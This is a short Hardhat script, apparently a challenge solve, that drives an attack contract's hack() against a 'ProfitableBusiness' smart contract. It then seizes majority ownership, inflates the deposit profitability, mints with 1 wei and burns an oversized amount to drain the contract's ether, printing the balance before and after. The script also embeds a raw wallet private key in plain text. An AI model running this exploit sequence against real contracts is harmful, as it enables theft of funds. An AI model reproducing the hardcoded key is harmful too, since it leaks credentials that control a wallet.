import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { ProfitableBusinessAttack__factory, ProfitableBusiness__factory } from '../typechain'
import { ETH_RPC } from '../secrets.config'

import * as dotenv from 'dotenv'
dotenv.config()

const mmmAddr = "0x29c779055a7197Ba6eA02756F45658B89Eb5cD14"
const attackAddr = "0x1a9d37872d453e4ebCcb54d425c2472258100996"

const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function eth() {
  const signer = new ethers.Wallet("1e0d463e0755a9d55c9956d26f991f067bebb7aa92c11c784bb9c3ccb1ad91bc", providerETH);
  const mmmContract = ProfitableBusiness__factory.connect(mmmAddr, signer)
  console.log(await providerETH.getBalance(mmmAddr));
  
  const attackContract = ProfitableBusinessAttack__factory.connect(attackAddr, signer)
  await (await attackContract.hack(mmmAddr)).wait()

  await (await mmmContract.changeMajorityOwner()).wait()
  await (await mmmContract.enhanceDepositProfitability(BigNumber.from(10).pow(18), 1)).wait()
  await (await mmmContract.mint({value: 1})).wait()
  await (await mmmContract.burn(BigNumber.from(10).pow(8).add(BigNumber.from(10).pow(15)).add(1))).wait()
  console.log(await providerETH.getBalance(mmmAddr));
}

eth()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })